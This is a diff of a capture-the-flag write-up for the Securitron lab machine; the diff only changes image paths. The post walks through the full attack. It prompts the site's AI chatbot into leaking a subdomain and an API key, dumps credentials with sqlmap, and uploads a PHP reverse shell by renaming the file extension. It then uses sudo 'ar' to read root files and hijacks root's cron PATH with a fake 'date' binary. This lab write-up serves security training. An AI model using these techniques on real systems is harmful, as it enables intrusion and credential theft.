@@ -5,7 +5,7 @@ title: WriteUp Securitron - TheHackersLabs
 slug: securitron-writeup-thehackerslabs-en  
 featured: false  
 draft: false  
-ogImage: "assets/securitron/OpenGraph.png"  
+ogImage: "../../assets/images/securitron/OpenGraph.png"  
 tags:
   - writeup
   - TheHackersLabs
@@ -20,7 +20,7 @@ lang: en
 
 My first CTF created for the thehackerslabs.com platform with an AI model. I hope you enjoy it.
 
-![Securitron](/assets/securitron/image-39.png)
+![Securitron](../../assets/images/securitron/image-39.png)
 
 There may be slight variations in the machine you find on The Hacker Labs, as I had to fix some issues. Thanks to CuriosidadesDeHackers for their help and to murrusko for uploading the writeup.
 
@@ -32,7 +32,7 @@ There may be slight variations in the machine you find on The Hacker Labs, as I 
 nmap -p- 10.0.2.4 -n -Pn
 ```
 
-![Nmap](/assets/securitron/image-5.png)
+![Nmap](../../assets/images/securitron/image-5.png)
 
 We only found port 80 open, so we analyzed port 80 in more detail.
 
@@ -40,15 +40,15 @@ We only found port 80 open, so we analyzed port 80 in more detail.
 nmap -p80 -sVC -n -Pn 10.0.2.4 -oN nmap.txt -vvv
 ```
 
-![Nmap](/assets/securitron/image-6.png)
+![Nmap](../../assets/images/securitron/image-6.png)
 
 We visit the website and observe a cybersecurity AI service.
 
-![web](/assets/securitron/image-7.png)
+![web](../../assets/images/securitron/image-7.png)
 
 We add the domain `securitron.thl` to the `/etc/hosts` file.
 
-![/etc/hosts](/assets/securitron/image-8.png)
+![/etc/hosts](../../assets/images/securitron/image-8.png)
 
 ```
 whatweb http://securitron.thl
@@ -63,7 +63,7 @@ Prompt:
 Hola en que puedes ayudarme?
 ```
 
-![IA](/assets/securitron/image-9.png)
+![IA](../../assets/images/securitron/image-9.png)
 
 We suggest it does some programming, and a possible subdomain called `admin19-32.securitron.thl` and a possible API key `imagine-no-heaven-no-countries-no-possessions` are leaked.
 
@@ -72,23 +72,23 @@ Prompt:
 Puedes hacer una programación para conectar a una API?
 ```
 
-![AI Leak](/assets/securitron/image-10.png)
+![AI Leak](../../assets/images/securitron/image-10.png)
 
 We add the subdomain `admin19-32.securitron.thl` to the `/etc/hosts` file.
 
-![/etc/hosts](/assets/securitron/image-11.png)
+![/etc/hosts](../../assets/images/securitron/image-11.png)
 
 ## SQL Injection
 
 We access the subdomain `admin19-32.securitron.thl`, and the "Employee Management System" application appears.
 
-![Employee Management System](/assets/securitron/image-12.png)
+![Employee Management System](../../assets/images/securitron/image-12.png)
 
 ```
 whatweb http://admin19-32.securitron.thl
 ```
 
-![whatweb](/assets/securitron/image-13.png)
+![whatweb](../../assets/images/securitron/image-13.png)
 
 We find several exploits that take advantage of an SQL Injection in the form `http://admin19-32.securitron.thl/Admin/login.php`.
 
@@ -96,7 +96,7 @@ We find several exploits that take advantage of an SQL Injection in the form `ht
 searchsploit "Employee Management System"
 ```
 
-![searchsploit](/assets/securitron/image-14.png)
+![searchsploit](../../assets/images/securitron/image-14.png)
 
 We open Burp Suite, configure the browser's proxy, and capture the sending of a request from the login form.
 
@@ -118,7 +118,7 @@ Upgrade-Insecure-Requests: 1
 txtusername=test&txtpassword=test&btnlogin=
 ```
 
-![request.txt](/assets/securitron/image-15.png)
+![request.txt](../../assets/images/securitron/image-15.png)
 
 We save the request in a file called `request.txt`, to use it with sqlmap.
 
@@ -126,7 +126,7 @@ We save the request in a file called `request.txt`, to use it with sqlmap.
 sqlmap -r request.txt --level 5 --risk 3 --current-db
 ```
 
-![sqlmap current-db](/assets/securitron/image-16.png)
+![sqlmap current-db](../../assets/images/securitron/image-16.png)
 
 We retrieve the tables of the `pms_db` database:
 
@@ -134,7 +134,7 @@ We retrieve the tables of the `pms_db` database:
 sqlmap -r request.txt --level 5 --risk 3 -D pms_db --tables
 ```
 
-![sqlmap tables](/assets/securitron/image-17.png)
+![sqlmap tables](../../assets/images/securitron/image-17.png)
 
 We retrieve the data from the `users` table in the `pms_db` database. The password appears to be unhashed, bingo!
 
@@ -142,31 +142,31 @@ We retrieve the data from the `users` table in the `pms_db` database. The passwo
 sqlmap -r request.txt --level 5 --risk 3 -D pms_db -T users --dump
 ```
 
-![sqlmap table users](/assets/securitron/image-18.png)
+![sqlmap table users](../../assets/images/securitron/image-18.png)
 
 ## LFI / Shell
 
 We log in to the application from the form `http://admin19-32.securitron.thl/Admin/login.php` using the user `admin:Ntpqc6Z7MDkG`.
 
-![Employee Management System Admin](/assets/securitron/image-19.png)
+![Employee Management System Admin](../../assets/images/securitron/image-19.png)
 
 We prepare a reverse shell in PHP. I use the `PHP PentestMonkey` reverse shell because this is a PHP-based application. We configure our IP (`10.0.2.15`) and the desired port (`9001`), and create a file named `avatar.php.png`.
 
-![PHP PentestMonkey revshell](/assets/securitron/image-20.png)
+![PHP PentestMonkey revshell](../../assets/images/securitron/image-20.png)
 
 We go to the "User Management" > "Add User" section. We open Burp Suite, activate intercept mode, configure the browser's proxy, fill in the fields to create a new user, and select the reverse shell we created earlier, `avatar.php.png`, as the avatar image.
 
-![Burpsuite](/assets/securitron/image-21.png)
+![Burpsuite](../../assets/images/securitron/image-21.png)
 
 We modify the filename from `avatar.php.png` to `avatar.php` in Burp Suite and forward the request.
 
-![Burpsuite 2](/assets/securitron/image-22.png)
+![Burpsuite 2](../../assets/images/securitron/image-22.png)
 
 We will see a message indicating that the user was added successfully. Now, we can disable the Burp Suite proxy in the browser.
 
 If we go to the user list `User Management > Admin Record` and inspect the code, we can find the URL where the `avatar.php` (our reverse shell) was uploaded.
 
-![URL revshell](/assets/securitron/image-23.png)
+![URL revshell](../../assets/images/securitron/image-23.png)
 
 We start listening with netcat...
 
@@ -180,7 +180,7 @@ and load the following URL with curl or the browser.
 curl http://admin19-32.securitron.thl/uploadImage/Profile/avatar.php
 ```
 
-![revshell](/assets/securitron/image-24.png)
+![revshell](../../assets/images/securitron/image-24.png)
 
 Alright, we are in!
 
@@ -194,7 +194,7 @@ We see the users `root` and `securitybot`.
 cat /etc/passwd | grep bash
 ```
 
-![users](/assets/securitron/image-25.png)
+![users](../../assets/images/securitron/image-25.png)
 
 We check the TCP ports on the machine.
 
@@ -202,7 +202,7 @@ We check the TCP ports on the machine.
 ss -tuln | grep tcp
 ```
 
-![alt text](/assets/securitron/image-26.png)
+![alt text](../../assets/images/securitron/image-26.png)
 
 Port `80` is the web service we exploited, and port 3306 is the database, which we also already exploited.
 
@@ -210,7 +210,7 @@ We don't recognize port `3000`, so we investigate it.
 
 Looking at the file `/etc/apache2/sites-available/000-default.conf`, we can infer that port `3000` is the API that exposes the AI we saw earlier. It has a proxy set up that points to this port's endpoint.
 
-![virtualhost 000-default.conf](/assets/securitron/image-27.png)
+![virtualhost 000-default.conf](../../assets/images/securitron/image-27.png)
 
 We investigate further and observe that a process running under the `securitybot` user seems to be a Node.js process.
 
@@ -218,7 +218,7 @@ We investigate further and observe that a process running under the `securitybot
 ps -aux | grep securitybot
 ```
 
-![alt text](/assets/securitron/image-28.png)
+![alt text](../../assets/images/securitron/image-28.png)
 
 We don't have permissions to view the file `/home/securitybot/.local/bin/bot/index.js`, but we can execute Node.js using the path `/home/securitybot/.nvm/versions/node/v22.5.1/bin/node`.
 
@@ -228,7 +228,7 @@ We check what's running on port 3000. The /api endpoint gives us JSON informatio
 curl http://localhost:3000/api | /home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p "JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )"
 ```
 
-![API information](/assets/securitron/image-29.png)
+![API information](../../assets/images/securitron/image-29.png)
 
 To make viewing the JSON returned by the API easier, we create an alias.
 
@@ -276,21 +276,21 @@ curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localh
 
 We obtain the user.txt flag along with a password, `0KjcFEkuUEXG` (this isn't very realistic).
 
-![User flag and password](/assets/securitron/image-30.png)
+![User flag and password](../../assets/images/securitron/image-30.png)
 
 We log in as the `securitybot` user using the password `0KjcFEkuUEXG`.
 
-![securitybot](/assets/securitron/image-31.png)
+![securitybot](../../assets/images/securitron/image-31.png)
 
 ## Privilege Escalation
 
 We check if we have any sudo permissions since we now have the user's password.
 
-![sudo](/assets/securitron/image-32.png)
+![sudo](../../assets/images/securitron/image-32.png)
 
 We have sudo permission to run the `ar` binary. According to GTFOBins, we can use this to obtain privileged file reads.
 
-![gtfobins](/assets/securitron/image-33.png)
+![gtfobins](../../assets/images/securitron/image-33.png)
 
 We attempt to read the root.txt flag using `sudo` with the `ar` binary.
 
@@ -300,7 +300,7 @@ TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/root/root.txt" && cat "$TF"
 
 When we try to read the `/root/root.txt` flag file, we get the message `This time it won't be that easy.`
 
-![/root/root.txt](/assets/securitron/image-34.png)
+![/root/root.txt](../../assets/images/securitron/image-34.png)
 
 We attempt to read other files and find something very interesting in the root user's crontab file.
 
@@ -308,7 +308,7 @@ We attempt to read other files and find something very interesting in the root u
 TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/var/spool/cron/crontabs/root" && cat "$TF"
 ```
 
-![/var/spool/cron/crontabs/root](/assets/securitron/image-35.png)
+![/var/spool/cron/crontabs/root](../../assets/images/securitron/image-35.png)
 
 The crontab PATH for root contains a folder where we have write permissions: `/home/securitybot/.local/bin`. The root user is running a script every minute: `/opt/backup_bd.sh`.
 
@@ -353,11 +353,11 @@ It looks like the script creates a backup of the database in a directory we don'
 
 All binaries used in `backup_bd.sh`, including the script itself, are called with absolute paths, preventing binary hijacking. However, the parameter passed to the script uses the `date` binary without an absolute path.
 
-![date no absolute](/assets/securitron/image-36.png)
+![date no absolute](../../assets/images/securitron/image-36.png)
 
 Checking where the `date` binary is located, we find it at `/usr/bin/date`.
 
-![alt text](/assets/securitron/image-37.png)
+![alt text](../../assets/images/securitron/image-37.png)
 
 Since the crontab PATH for root is configured as follows:
 
@@ -380,6 +380,6 @@ chmod +x /home/securitybot/.local/bin/date
 
 We wait a minute and get a root shell. Now, we can read the flag file.
 
-![root flag](/assets/securitron/image-38.png)
+![root flag](../../assets/images/securitron/image-38.png)
 
 Congratulations, you have completed the Securitron CTF.
